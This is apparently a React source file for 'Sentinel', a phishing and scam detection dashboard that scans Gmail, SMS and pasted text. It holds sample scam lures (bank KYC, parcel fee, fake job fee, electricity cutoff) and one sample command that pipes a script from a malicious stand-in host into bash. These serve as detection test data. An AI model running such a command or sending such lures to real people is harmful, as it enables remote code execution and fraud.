import { useEffect, useRef, useState } from "react";
import {
  ShieldCheck,
  Mail,
  Activity,
  Settings,
  Search,
  ChevronRight,
  AlertTriangle,
  CheckCircle2,
  Circle,
  RefreshCw,
  ExternalLink,
  MessageSquare,
  Briefcase,
  Link as LinkIcon,
  Globe,
  Smartphone,
  Copy,
  Check,
  ShieldAlert,
  Play,
  Terminal
} from "lucide-react";

import "./App.css";

const API = "http://localhost:5000";

const SANDBOX_MODES = [
  {
    id: "email",
    label: "Email",
    icon: Mail,
    placeholder: "Paste email subject, sender, and body here...",
    sample: "URGENT: Your account access will be suspended within 24 hours due to suspicious activity. Please verify your password immediately at http://verify-account-login.com to avoid account deactivation."
  },
  {
    id: "message",
    label: "Messages",
    icon: MessageSquare,
    placeholder: "Paste SMS, WhatsApp, or chat message here...",
    sample: "Dear customer, your bank KYC has expired today. Your electricity and bank account will be blocked tonight. Share your 6-digit OTP immediately to avoid disconnection."
  },
  {
    id: "job",
    label: "Job Offers",
    icon: Briefcase,
    placeholder: "Paste job offer, recruitment message, or internship details here...",
    sample: "Congratulations! Direct selection for Google Work From Home Internship. Guaranteed salary Rs 50,000/month. No interview needed. Pay Rs 1500 refundable registration fee to HR on Telegram @GoogleRecruiter."
  },
  {
    id: "github_linkedin",
    label: "GitHub / LinkedIn",
    icon: Globe,
    placeholder: "Paste GitHub issue, collaboration invite, or recruiter message here...",
    sample: "Hi Developer, loved your GitHub repo! We want to invite you to collaborate on our private Web3 project. To run the automated test suite, execute: curl -s https://malicious-build.xyz/setup.sh | bash"
  },
  {
    id: "url",
    label: "URLs",
    icon: LinkIcon,
    placeholder: "Enter URL to check (e.g. https://paypal.com-security.net/login)...",
    sample: "http://paypal.com-security.net/login/auth"
  }
];

function MetricCard({ label, value, change, danger, icon: Icon }) {
  return (
    <div className="metric">
      <div className="metric-header-row">
        <p>{label}</p>
        {Icon && <Icon size={14} className="metric-icon-muted" />}
      </div>
      <div className={`metric-value ${danger ? "danger-text" : ""}`}>
        {value}
      </div>
      <span>{change}</span>
    </div>
  );
}

function App() {
  const [active, setActive] = useState("Overview");
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [feedFilter, setFeedFilter] = useState("all"); // 'all' | 'email' | 'sms'
  const [expandedId, setExpandedId] = useState(null);

  // System status
  const [status, setStatus] = useState({
    gmail: { connected: false, email: null, isMonitoring: false, lastScanTime: null, scannedCount: 0 },
    phone: { verified: false, phoneNumber: null, pairingKey: null, scannedCount: 0 },
    stats: { totalEmailsScanned: 0, totalSmsScanned: 0, highRiskEmails: 0, highRiskSms: 0 }
  });

  const [feedItems, setFeedItems] = useState([]);
  const [isScanningNow, setIsScanningNow] = useState(false);
  const [copiedKey, setCopiedKey] = useState(false);

  // Phone OTP Flow State
  const [phoneInput, setPhoneInput] = useState("+91 ");
  const [otpInput, setOtpInput] = useState("");
  const [otpSent, setOtpSent] = useState(false);
  const [devOtp, setDevOtp] = useState("");
  const [otpLoading, setOtpLoading] = useState(false);
  const [phoneFeedback, setPhoneFeedback] = useState({ type: "", message: "" });

  // Simulator State
  const [simSender, setSimSender] = useState("VK-SBIINB");
  const [simMessage, setSimMessage] = useState(
    "Dear customer, your SBI bank KYC has expired today. Your account will be blocked within 24 hours. Update your details immediately at http://sbi-kyc-verify.xyz or share your OTP."
  );
  const [isSimulating, setIsSimulating] = useState(false);
  const [simFeedback, setSimFeedback] = useState(null);

  // Manual Sandbox State
  const [sandboxMode, setSandboxMode] = useState("message");
  const [sandboxText, setSandboxText] = useState("");
  const [sandboxUrl, setSandboxUrl] = useState("");
  const [isAnalyzingSandbox, setIsAnalyzingSandbox] = useState(false);
  const [sandboxResult, setSandboxResult] = useState(null);
  const [sandboxError, setSandboxError] = useState("");

  const refreshIntervalRef = useRef(null);

  // =================================================
  // DATA POLLING & SYNCHRONIZATION
  // =================================================

  useEffect(() => {
    fetchStatusAndFeed();

    // Poll live feed every 4 seconds
    refreshIntervalRef.current = setInterval(() => {
      fetchStatusAndFeed(true);
    }, 4000);

    return () => {
      if (refreshIntervalRef.current) clearInterval(refreshIntervalRef.current);
    };
  }, []);

  async function fetchStatusAndFeed(silent = false) {
    try {
      if (!silent) setLoading(true);

      const [statusRes, feedRes] = await Promise.all([
        fetch(`${API}/api/status?_t=${Date.now()}`),
        fetch(`${API}/api/activity/feed?_t=${Date.now()}`)
      ]);

      if (statusRes.ok) {
        const statusData = await statusRes.json();
        setStatus(statusData);
      }

      if (feedRes.ok) {
        const feedData = await feedRes.json();
        setFeedItems(feedData.items || []);
      }
    } catch (err) {
      console.warn("[Sentinel] Sync notice:", err.message);
    } finally {
      if (!silent) setLoading(false);
    }
  }

  // =================================================
  // GMAIL ACTIONS
  // =================================================

  function connectGmail() {
    window.location.href = `${API}/auth/google`;
  }

  async function disconnectGmail() {
    if (!window.confirm("Are you sure you want to disconnect your Gmail account from automatic monitoring?")) return;
    try {
      const res = await fetch(`${API}/api/gmail/disconnect`, { method: "POST" });
      if (res.ok) {
        await fetchStatusAndFeed();
        alert("Gmail account disconnected and background monitoring stopped.");
      }
    } catch (err) {
      alert("Failed to disconnect: " + err.message);
    }
  }

  async function triggerManualScan() {
    if (isScanningNow) return;
    try {
      setIsScanningNow(true);
      const res = await fetch(`${API}/api/gmail/scan-now`, { method: "POST" });
      const data = await res.json();
      if (res.ok) {
        await fetchStatusAndFeed(true);
      } else {
        alert(data.error || "Scan failed.");
      }
    } catch (err) {
      alert("Failed to trigger scan: " + err.message);
    } finally {
      setIsScanningNow(false);
    }
  }

  // =================================================
  // PHONE VERIFICATION FLOW
  // =================================================

  async function handleSendOtp() {
    setPhoneFeedback({ type: "", message: "" });
    if (!phoneInput.trim()) {
      setPhoneFeedback({ type: "error", message: "Please enter a valid phone number with country code." });
      return;
    }

    try {
      setOtpLoading(true);
      const res = await fetch(`${API}/api/phone/send-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phoneNumber: phoneInput })
      });
      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.error || "Failed to dispatch verification code.");
      }

      setOtpSent(true);
      if (data.devOtp) {
        setDevOtp(data.devOtp);
        setOtpInput(data.devOtp); // auto-populate for seamless development testing
      }
      setPhoneFeedback({
        type: "success",
        message: data.message || "Verification code dispatched successfully."
      });
    } catch (err) {
      setPhoneFeedback({ type: "error", message: err.message });
    } finally {
      setOtpLoading(false);
    }
  }

  async function handleVerifyOtp() {
    setPhoneFeedback({ type: "", message: "" });
    if (!otpInput.trim()) {
      setPhoneFeedback({ type: "error", message: "Please enter the 6-digit verification code." });
      return;
    }

    try {
      setOtpLoading(true);
      const res = await fetch(`${API}/api/phone/verify-otp`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phoneNumber: phoneInput,
          otp: otpInput
        })
      });
      const data = await res.json();

      if (!res.ok) {
        throw new Error(data.error || "Verification failed.");
      }

      setPhoneFeedback({
        type: "success",
        message: "Phone verified successfully! Android device pairing key generated."
      });
      setOtpSent(false);
      setDevOtp("");
      await fetchStatusAndFeed();
    } catch (err) {
      setPhoneFeedback({ type: "error", message: err.message });
    } finally {
      setOtpLoading(false);
    }
  }

  async function handleDisconnectPhone() {
    if (!window.confirm("Disconnect phone number and revoke Android device pairing key?")) return;
    try {
      await fetch(`${API}/api/phone/disconnect`, { method: "POST" });
      setOtpSent(false);
      setPhoneFeedback({ type: "", message: "" });
      await fetchStatusAndFeed();
    } catch (err) {
      alert("Failed to disconnect phone: " + err.message);
    }
  }

  function copyPairingKey() {
    if (!status.phone.pairingKey) return;
    navigator.clipboard.writeText(status.phone.pairingKey);
    setCopiedKey(true);
    setTimeout(() => setCopiedKey(false), 2000);
  }

  // =================================================
  // SMS SIMULATOR ACTION
  // =================================================

  async function handleSimulateSms(presetSender, presetMsg) {
    const sender = presetSender || simSender;
    const msg = presetMsg || simMessage;

    try {
      setIsSimulating(true);
      setSimFeedback(null);
      const res = await fetch(`${API}/api/sms/simulate`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sender, message: msg })
      });
      const data = await res.json();
      if (res.ok) {
        setSimFeedback(data);
        await fetchStatusAndFeed(true);
      } else {
        alert(data.error || "Simulation failed.");
      }
    } catch (err) {
      alert("Failed to simulate SMS: " + err.message);
    } finally {
      setIsSimulating(false);
    }
  }

  // =================================================
  // MANUAL SANDBOX ACTION
  // =================================================

  async function handleAnalyzeSandbox() {
    setSandboxError("");
    setSandboxResult(null);

    const isUrl = sandboxMode === "url";
    const value = isUrl ? sandboxUrl.trim() : sandboxText.trim();

    if (!value) {
      setSandboxError(isUrl ? "Please provide a valid URL." : "Please enter message text to inspect.");
      return;
    }

    try {
      setIsAnalyzingSandbox(true);
      const res = await fetch(`${API}/api/analyze`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: sandboxMode,
          text: isUrl ? "" : value,
          url: isUrl ? value : ""
        })
      });
      const data = await res.json();
      if (!res.ok) {
        throw new Error(data.error || "Analysis failed.");
      }
      setSandboxResult(data);
    } catch (err) {
      setSandboxError(err.message || "Failed to connect to AI engine.");
    } finally {
      setIsAnalyzingSandbox(false);
    }
  }

  function handleLoadSandboxSample() {
    const activeObj = SANDBOX_MODES.find(m => m.id === sandboxMode);
    if (!activeObj) return;
    if (sandboxMode === "url") {
      setSandboxUrl(activeObj.sample);
    } else {
      setSandboxText(activeObj.sample);
    }
    setSandboxResult(null);
    setSandboxError("");
  }

  function handleClearSandbox() {
    setSandboxText("");
    setSandboxUrl("");
    setSandboxResult(null);
    setSandboxError("");
  }

  // =================================================
  // FILTERING & METRICS
  // =================================================

  const filteredFeed = feedItems.filter(item => {
    // Channel filter
    if (feedFilter === "email" && item.source !== "email") return false;
    if (feedFilter === "sms" && item.source !== "sms") return false;

    // Search query filter
    if (!search.trim()) return true;
    const text = `${item.sender || ""} ${item.title || ""} ${item.preview || ""} ${item.risk || ""}`.toLowerCase();
    return text.includes(search.toLowerCase());
  });

  const totalScanned = (status.stats.totalEmailsScanned || 0) + (status.stats.totalSmsScanned || 0);
  const totalThreats = (status.stats.highRiskEmails || 0) + (status.stats.highRiskSms || 0);
  const healthScore = totalScanned === 0 ? 100 : Math.max(10, 100 - totalThreats * 20);

  const activeModeObj = SANDBOX_MODES.find(m => m.id === sandboxMode) || SANDBOX_MODES[1];

  const navigation = [
    { name: "Overview", icon: ShieldCheck },
    { name: "Live Feed", icon: Activity },
    { name: "Phone Defense", icon: Smartphone },
    { name: "Manual Sandbox", icon: Terminal },
    { name: "Settings", icon: Settings }
  ];

  return (
    <div className="app">
      {/* SIDEBAR */}
      <aside className="sidebar">
        <div className="brand">
          <div className="brand-mark">
            <ShieldCheck size={21} />
          </div>
          <div>
            <h2>SENTINEL</h2>
            <span>AUTOMATIC DEFENSE</span>
          </div>
        </div>

        <nav>
          <p className="nav-label">COMMAND</p>
          {navigation.map((item) => {
            const Icon = item.icon;
            return (
              <button
                key={item.name}
                className={`nav-item ${active === item.name ? "active" : ""}`}
                onClick={() => setActive(item.name)}
              >
                <Icon size={17} />
                <span>{item.name}</span>
              </button>
            );
          })}
        </nav>

        <div className="sidebar-bottom">
          <div className="system-status">
            <Circle size={8} fill={status.gmail.isMonitoring || status.phone.verified ? "#50fa7b" : "#ffb86c"} />
            <span>
              {status.gmail.isMonitoring && status.phone.verified
                ? "GMAIL + PHONE ARMED"
                : status.gmail.isMonitoring
                ? "GMAIL AUTO-SCAN ARMED"
                : status.phone.verified
                ? "PHONE DEFENSE ARMED"
                : "READY TO ARM"}
            </span>
          </div>
          <div className="version">SENTINEL ENGINE · v2.0 AUTOMATIC</div>
        </div>
      </aside>

      {/* MAIN VIEWPORT */}
      <main className="main">
        {/* TOP COMMAND BAR */}
        <header className="topbar">
          <div>
            <p className="eyebrow">AUTOMATIC THREAT INTELLIGENCE SYSTEM</p>
            <h1>{active}</h1>
          </div>

          <div className="top-actions">
            <div className="search">
              <Search size={16} />
              <input
                placeholder="Search alerts, sender, domains..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
              />
              <kbd>Ctrl K</kbd>
            </div>

            <button
              className="text-button top-sync-btn"
              onClick={() => fetchStatusAndFeed(false)}
              title="Refresh Security Node"
            >
              <RefreshCw size={14} className={loading ? "spin" : ""} />
            </button>
            <div className="avatar">S</div>
          </div>
        </header>

        {/* OVERVIEW TAB */}
        {active === "Overview" && (
          <>
            {/* HERO HEALTH & ACTIVE CHANNELS */}
            <section className="hero">
              <div>
                <p className="section-label">REAL-TIME INBOX &amp; MOBILE DEFENSE STATUS</p>
                <div className="health-row">
                  <span className="health-number">{healthScore}</span>
                  <span className="health-unit">/100</span>
                </div>
                <p className="health-description">
                  {status.gmail.connected && status.phone.verified ? (
                    <>Monitoring Gmail <strong>{status.gmail.email}</strong> and Mobile <strong>{status.phone.phoneNumber}</strong></>
                  ) : status.gmail.connected ? (
                    <>Monitoring Gmail <strong>{status.gmail.email}</strong> (Phone disconnected)</>
                  ) : status.phone.verified ? (
                    <>Monitoring Phone <strong>{status.phone.phoneNumber}</strong> (Gmail disconnected)</>
                  ) : (
                    <>Connect your Gmail or Phone to arm automatic background scam inspection.</>
                  )}
                </p>
              </div>

              <div className="health-ring">
                <div>
                  <ShieldCheck size={26} color={healthScore >= 80 ? "#50fa7b" : "#ffb86c"} />
                  <span>{healthScore >= 80 ? "ARMED" : "ALERTS"}</span>
                </div>
              </div>
            </section>

            {/* MONITORING NODES SUMMARY ROW */}
            <div className="nodes-overview-grid">
              {/* GMAIL NODE CARD */}
              <div className="node-status-card">
                <div className="node-card-header">
                  <div className="node-icon-box">
                    <Mail size={18} />
                  </div>
                  <div>
                    <h4>GMAIL AUTO-SCANNER</h4>
                    <span className="node-sub">Official Google OAuth 2.0 API</span>
                  </div>
                  <span className={`status-pill ${status.gmail.connected ? "pill-active" : "pill-idle"}`}>
                    {status.gmail.isMonitoring ? "POLLING ACTIVE (20s)" : status.gmail.connected ? "CONNECTED" : "DISCONNECTED"}
                  </span>
                </div>

                <div className="node-card-body">
                  <p className="node-desc">
                    {status.gmail.connected ? (
                      <>Account: <strong>{status.gmail.email}</strong><br />Scanned <strong>{status.gmail.scannedCount}</strong> emails in background.</>
                    ) : (
                      <>Read-only inbox scanning. Automatically catches phishing lures before you click.</>
                    )}
                  </p>

                  <div className="node-card-actions">
                    {status.gmail.connected ? (
                      <>
                        <button
                          className="connect-button btn-sm"
                          onClick={triggerManualScan}
                          disabled={isScanningNow}
                        >
                          <RefreshCw size={13} className={isScanningNow ? "spin" : ""} />
                          {isScanningNow ? "Scanning..." : "Scan Now"}
                        </button>
                        <button className="text-button btn-danger-text" onClick={disconnectGmail}>
                          Disconnect
                        </button>
                      </>
                    ) : (
                      <button className="connect-button btn-sm" onClick={connectGmail}>
                        <Mail size={14} /> Connect Gmail <ExternalLink size={12} />
                      </button>
                    )}
                  </div>
                </div>
              </div>

              {/* PHONE NODE CARD */}
              <div className="node-status-card">
                <div className="node-card-header">
                  <div className="node-icon-box">
                    <Smartphone size={18} />
                  </div>
                  <div>
                    <h4>PHONE SMS DEFENSE</h4>
                    <span className="node-sub">Android Companion Agent</span>
                  </div>
                  <span className={`status-pill ${status.phone.verified ? "pill-active" : "pill-idle"}`}>
                    {status.phone.verified ? "PAIRED & PROTECTED" : "PAIRING REQUIRED"}
                  </span>
                </div>

                <div className="node-card-body">
                  <p className="node-desc">
                    {status.phone.verified ? (
                      <>Verified: <strong>{status.phone.phoneNumber}</strong><br />Received &amp; analyzed <strong>{status.phone.scannedCount}</strong> mobile SMS alerts.</>
                    ) : (
                      <>Intercepts banking KYC, fake OTP theft, and parcel scams automatically on your phone.</>
                    )}
                  </p>

                  <div className="node-card-actions">
                    {status.phone.verified ? (
                      <>
                        <button className="connect-button btn-sm" onClick={() => setActive("Phone Defense")}>
                          <Smartphone size={13} /> View Android Pairing
                        </button>
                        <button className="text-button btn-danger-text" onClick={handleDisconnectPhone}>
                          Disconnect
                        </button>
                      </>
                    ) : (
                      <button className="connect-button btn-sm" onClick={() => setActive("Phone Defense")}>
                        <Smartphone size={14} /> Connect Phone &amp; App
                      </button>
                    )}
                  </div>
                </div>
              </div>
            </div>

            {/* METRICS ROW */}
            <section className="metrics" style={{ marginTop: "20px" }}>
              <MetricCard
                label="TOTAL INSPECTED"
                value={totalScanned}
                change="Emails &amp; SMS"
                icon={Activity}
              />
              <MetricCard
                label="THREATS BLOCKED"
                value={String(totalThreats).padStart(2, "0")}
                change={`${status.stats.highRiskEmails} email + ${status.stats.highRiskSms} SMS`}
                danger={totalThreats > 0}
                icon={ShieldAlert}
              />
              <MetricCard
                label="MONITORED CHANNELS"
                value={String((status.gmail.connected ? 1 : 0) + (status.phone.verified ? 1 : 0)).padStart(2, "0")}
                change="Inbox + Phone"
                icon={Circle}
              />
              <MetricCard
                label="AI DECISION NODE"
                value="ONLINE"
                change="ML + Rules + Bayes + Fuzzy"
                icon={ShieldCheck}
              />
            </section>

            {/* LIVE AUTOMATED THREAT STREAM */}
            <section className="panel" style={{ marginTop: "24px" }}>
              <div className="panel-header">
                <div>
                  <p className="section-label">REAL-TIME INCOMING STREAM</p>
                  <h3>Live Scanned Activity Feed</h3>
                </div>

                {/* FILTER PILLS */}
                <div className="feed-filter-bar">
                  <button
                    className={`feed-pill ${feedFilter === "all" ? "active" : ""}`}
                    onClick={() => setFeedFilter("all")}
                  >
                    All ({feedItems.length})
                  </button>
                  <button
                    className={`feed-pill ${feedFilter === "email" ? "active" : ""}`}
                    onClick={() => setFeedFilter("email")}
                  >
                    <Mail size={12} /> Emails ({status.stats.totalEmailsScanned})
                  </button>
                  <button
                    className={`feed-pill ${feedFilter === "sms" ? "active" : ""}`}
                    onClick={() => setFeedFilter("sms")}
                  >
                    <Smartphone size={12} /> SMS ({status.stats.totalSmsScanned})
                  </button>
                </div>
              </div>

              {/* FEED LIST */}
              <div className="activity-feed-container">
                {filteredFeed.length === 0 ? (
                  <div className="feed-empty-state">
                    <ShieldCheck size={36} color="#3d4954" />
                    <h4>No incoming threats detected</h4>
                    <p>
                      {status.gmail.connected || status.phone.verified
                        ? "Sentinel is actively monitoring your connected channels. Newly arriving emails and SMS will be analyzed automatically."
                        : "Connect your Gmail or Phone number above to initiate automatic threat inspection."}
                    </p>
                    <button
                      className="connect-button btn-sm"
                      style={{ marginTop: "14px" }}
                      onClick={() => handleSimulateSms(null, null)}
                    >
                      <Play size={13} /> Simulate Incoming Scam SMS
                    </button>
                  </div>
                ) : (
                  filteredFeed.map((item) => {
                    const isExpanded = expandedId === item.id;
                    const isHigh = item.risk === "HIGH";
                    const isMedium = item.risk === "MEDIUM";

                    return (
                      <div
                        key={item.id}
                        className={`feed-card ${isHigh ? "card-high" : isMedium ? "card-medium" : "card-low"}`}
                        onClick={() => setExpandedId(isExpanded ? null : item.id)}
                      >
                        <div className="feed-card-main">
                          <div className={`feed-source-badge ${item.source}`}>
                            {item.source === "email" ? <Mail size={15} /> : <Smartphone size={15} />}
                          </div>

                          <div className="feed-card-info">
                            <div className="feed-card-title-row">
                              <strong>{item.title}</strong>
                              <span className="feed-timestamp">
                                {item.timestamp ? new Date(item.timestamp).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }) : "Recent"}
                              </span>
                            </div>
                            <span className="feed-sender">Sender: {item.sender}</span>
                            <p className="feed-preview">{item.preview}</p>
                          </div>

                          <div className="feed-card-risk">
                            <span className={`risk ${isHigh ? "high" : isMedium ? "medium" : "low"}`}>
                              {item.risk} RISK ({item.score || 0}%)
                            </span>
                            <ChevronRight size={14} className={`feed-expand-chevron ${isExpanded ? "rotated" : ""}`} />
                          </div>
                        </div>

                        {/* EXPANDABLE THREAT INTELLIGENCE REASONS */}
                        {isExpanded && (
                          <div className="feed-card-details">
                            <div className="details-header">
                              <span className="section-label">THREAT INTELLIGENCE &amp; EVIDENCE</span>
                              <span className="details-score-label">Heuristic Risk Score: <strong>{item.score}/100</strong></span>
                            </div>
                            <ul className="details-reasons-list">
                              {item.reasons && item.reasons.length > 0 ? (
                                item.reasons.map((r, idx) => (
                                  <li key={idx}>
                                    <span className="reason-dot" />
                                    <span>{r}</span>
                                  </li>
                                ))
                              ) : (
                                <li>No suspicious indicators detected. Routine notification.</li>
                              )}
                            </ul>
                          </div>
                        )}
                      </div>
                    );
                  })
                )}
              </div>
            </section>
          </>
        )}

        {/* LIVE FEED TAB */}
        {active === "Live Feed" && (
          <section className="panel threat-panel">
            <div className="panel-header">
              <div>
                <p className="section-label">COMBINED AUDIT LOG</p>
                <h3>All Incoming Scanned Items</h3>
              </div>
              <button
                className="connect-button btn-sm"
                onClick={() => handleSimulateSms(null, null)}
              >
                <Play size={13} /> Simulate Sample Scam SMS
              </button>
            </div>

            <div className="activity-feed-container" style={{ padding: "18px 24px" }}>
              {filteredFeed.map((item) => (
                <div key={item.id} className="feed-card" style={{ marginBottom: "12px" }}>
                  <div className="feed-card-main">
                    <div className={`feed-source-badge ${item.source}`}>
                      {item.source === "email" ? <Mail size={15} /> : <Smartphone size={15} />}
                    </div>
                    <div className="feed-card-info">
                      <div className="feed-card-title-row">
                        <strong>{item.title}</strong>
                        <span className="feed-timestamp">{item.timestamp ? new Date(item.timestamp).toLocaleString() : "Recent"}</span>
                      </div>
                      <span className="feed-sender">Source: {item.source.toUpperCase()} | From: {item.sender}</span>
                      <p className="feed-preview">{item.preview}</p>
                      {item.reasons && (
                        <div className="details-reasons-preview">
                          {item.reasons.slice(0, 2).map((r, i) => (
                            <span key={i} className="reason-tag">• {r}</span>
                          ))}
                        </div>
                      )}
                    </div>
                    <span className={`risk ${item.risk === "HIGH" ? "high" : item.risk === "MEDIUM" ? "medium" : "low"}`}>
                      {item.risk} ({item.score || 0}%)
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </section>
        )}

        {/* PHONE DEFENSE & ANDROID COMPANION TAB */}
        {active === "Phone Defense" && (
          <div className="phone-defense-page">
            <section className="panel">
              <div className="panel-header">
                <div>
                  <p className="section-label">PHONE SETUP &amp; ANDROID COMPANION</p>
                  <h3>Connect Phone Number &amp; Arm Mobile Scam Defense</h3>
                </div>
              </div>

              <div className="phone-panel-body">
                {/* STEP 1: PHONE VERIFICATION */}
                <div className="phone-setup-step">
                  <div className="step-num-badge">1</div>
                  <div className="step-content">
                    <h4>Phone Number Verification</h4>
                    <p className="step-desc">
                      Enter your mobile number to bind your phone identity to Sentinel. Supports Indian (+91) and international numbers.
                    </p>

                    {!status.phone.verified ? (
                      <div className="phone-auth-box">
                        <div className="phone-input-row">
                          <input
                            type="text"
                            className="analyze-input"
                            style={{ maxWidth: "320px" }}
                            placeholder="+91 98765 43210"
                            value={phoneInput}
                            onChange={(e) => setPhoneInput(e.target.value)}
                            disabled={otpLoading || otpSent}
                          />
                          {!otpSent ? (
                            <button
                              className="connect-button"
                              onClick={handleSendOtp}
                              disabled={otpLoading}
                            >
                              {otpLoading ? "Sending OTP..." : "Send Verification OTP"}
                            </button>
                          ) : (
                            <button className="text-button" onClick={() => setOtpSent(false)}>
                              Change Number
                            </button>
                          )}
                        </div>

                        {otpSent && (
                          <div className="otp-verify-row" style={{ marginTop: "14px" }}>
                            <input
                              type="text"
                              className="analyze-input"
                              style={{ maxWidth: "200px", letterSpacing: "0.2em", fontWeight: "bold" }}
                              placeholder="6-digit OTP"
                              maxLength={6}
                              value={otpInput}
                              onChange={(e) => setOtpInput(e.target.value)}
                            />
                            <button
                              className="connect-button"
                              onClick={handleVerifyOtp}
                              disabled={otpLoading}
                            >
                              {otpLoading ? "Verifying..." : "Verify & Generate Pairing Key"}
                            </button>
                          </div>
                        )}

                        {devOtp && (
                          <div className="dev-otp-callout">
                            <span>DEVELOPMENT MODE:</span> Use sample verification OTP: <strong>{devOtp}</strong>
                          </div>
                        )}

                        {phoneFeedback.message && (
                          <div className={`analysis-alert ${phoneFeedback.type === "error" ? "error" : "success-alert"}`}>
                            {phoneFeedback.type === "error" ? <AlertTriangle size={15} /> : <CheckCircle2 size={15} />}
                            <span>{phoneFeedback.message}</span>
                          </div>
                        )}
                      </div>
                    ) : (
                      <div className="phone-verified-box">
                        <div className="verified-status-row">
                          <CheckCircle2 size={20} color="#50fa7b" />
                          <div>
                            <strong>{status.phone.phoneNumber}</strong>
                            <span>Phone Verified &amp; Bound to Security Node</span>
                          </div>
                          <button className="text-button btn-danger-text" onClick={handleDisconnectPhone}>
                            Disconnect Phone
                          </button>
                        </div>
                      </div>
                    )}
                  </div>
                </div>

                {/* STEP 2: ANDROID COMPANION PAIRING KEY */}
                <div className="phone-setup-step" style={{ marginTop: "28px" }}>
                  <div className="step-num-badge">2</div>
                  <div className="step-content">
                    <h4>Android Companion App Pairing</h4>
                    <p className="step-desc">
                      Download and install the <strong>Sentinel Android Companion</strong> APK from <code>android-companion/</code>. Enter the pairing credentials below to authorize your phone to send incoming SMS alerts for real-time analysis.
                    </p>

                    <div className="pairing-creds-card">
                      <div className="cred-field">
                        <span className="cred-label">BACKEND SERVER URL (LOCAL NETWORK):</span>
                        <code className="cred-value">{API}</code>
                      </div>

                      <div className="cred-field" style={{ marginTop: "14px" }}>
                        <span className="cred-label">DEVICE PAIRING API KEY:</span>
                        <div className="key-copy-row">
                          <code className="cred-value cred-key">
                            {status.phone.pairingKey || "Verify phone number in Step 1 to generate key"}
                          </code>
                          {status.phone.pairingKey && (
                            <button className="text-button" onClick={copyPairingKey}>
                              {copiedKey ? <Check size={14} color="#50fa7b" /> : <Copy size={14} />}
                              {copiedKey ? "Copied" : "Copy"}
                            </button>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* STEP 3: INTERACTIVE SCAM SIMULATOR */}
                <div className="phone-setup-step" style={{ marginTop: "28px" }}>
                  <div className="step-num-badge">3</div>
                  <div className="step-content">
                    <h4>Test Incoming SMS Scam Detection</h4>
                    <p className="step-desc">
                      Test Sentinel's phone protection right now without needing a physical Android device. Click a preset below to simulate an incoming scam SMS:
                    </p>

                    <div className="simulator-presets-row">
                      <button
                        className="preset-btn"
                        onClick={() => handleSimulateSms("VK-SBIINB", "Dear customer, your SBI bank KYC has expired today. Your account will be blocked tonight. Update your details immediately at http://sbi-kyc-verify.xyz")}
                        disabled={isSimulating}
                      >
                        ⚡ Bank KYC Scam (SBI)
                      </button>
                      <button
                        className="preset-btn"
                        onClick={() => handleSimulateSms("AM-INDPST", "Your India Post parcel is held at the sorting office due to unpaid customs fee of Rs 48. Pay now at http://ind-post-clear.top/pay to avoid return.")}
                        disabled={isSimulating}
                      >
                        📦 Fake Parcel Fee Scam
                      </button>
                      <button
                        className="preset-btn"
                        onClick={() => handleSimulateSms("VK-POWERC", "URGENT: Electricity power will be disconnected at 9:30 PM tonight due to unpaid bill. Call electricity officer immediately: 9876543210")}
                        disabled={isSimulating}
                      >
                        💡 Electricity Bill Cutoff Threat
                      </button>
                    </div>

                    <div style={{ marginTop: "16px" }}>
                      <span className="section-label" style={{ display: "block", marginBottom: "8px" }}>OR TEST CUSTOM INCOMING SMS</span>
                      <div style={{ display: "flex", gap: "10px", marginBottom: "8px" }}>
                        <input
                          type="text"
                          className="analyze-input"
                          style={{ maxWidth: "180px" }}
                          placeholder="Sender (e.g. VK-HDFCBK)"
                          value={simSender}
                          onChange={(e) => setSimSender(e.target.value)}
                        />
                        <button
                          className="connect-button btn-sm"
                          onClick={() => handleSimulateSms(simSender, simMessage)}
                          disabled={isSimulating}
                        >
                          <Play size={12} /> Analyze Custom SMS
                        </button>
                      </div>
                      <textarea
                        className="analyze-textarea"
                        rows={2}
                        placeholder="Type custom SMS message to simulate..."
                        value={simMessage}
                        onChange={(e) => setSimMessage(e.target.value)}
                      />
                    </div>

                    {simFeedback && (
                      <div className={`analysis-result-card risk-${simFeedback.risk_level.toLowerCase()}`} style={{ marginTop: "16px" }}>
                        <div className="result-header">
                          <div className="result-risk-badge">
                            <ShieldAlert size={16} />
                            <span>{simFeedback.risk_level} RISK DETECTED</span>
                          </div>
                          <strong>Score: {simFeedback.risk_score}/100</strong>
                        </div>
                        <p className="result-summary">{simFeedback.alert_message}</p>
                        <ul className="details-reasons-list">
                          {simFeedback.reasons?.map((r, i) => (
                            <li key={i}><span className="reason-dot" /><span>{r}</span></li>
                          ))}
                        </ul>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </section>
          </div>
        )}

        {/* MANUAL SANDBOX TAB (PRESERVED) */}
        {active === "Manual Sandbox" && (
          <section className="panel analyze-panel" style={{ marginTop: 0 }}>
            <div className="panel-header">
              <div>
                <p className="section-label">MANUAL THREAT SANDBOX</p>
                <h3>Ad-Hoc Message &amp; URL Inspector</h3>
              </div>
              <div className="sample-actions">
                <button className="text-button" onClick={handleLoadSandboxSample}>
                  Load Example
                </button>
              </div>
            </div>

            {/* MODE SELECTOR */}
            <div className="mode-selector">
              {SANDBOX_MODES.map((mode) => {
                const Icon = mode.icon;
                return (
                  <button
                    key={mode.id}
                    className={`mode-btn ${sandboxMode === mode.id ? "active" : ""}`}
                    onClick={() => {
                      setSandboxMode(mode.id);
                      setSandboxError("");
                      setSandboxResult(null);
                    }}
                  >
                    <Icon size={14} />
                    <span>{mode.label}</span>
                  </button>
                );
              })}
            </div>

            {/* INPUT FORM */}
            <div className="analyze-body">
              {sandboxMode === "url" ? (
                <input
                  type="text"
                  className="analyze-input"
                  placeholder={activeModeObj.placeholder}
                  value={sandboxUrl}
                  onChange={(e) => setSandboxUrl(e.target.value)}
                  onKeyDown={(e) => e.key === "Enter" && handleAnalyzeSandbox()}
                />
              ) : (
                <textarea
                  className="analyze-textarea"
                  rows={5}
                  placeholder={activeModeObj.placeholder}
                  value={sandboxText}
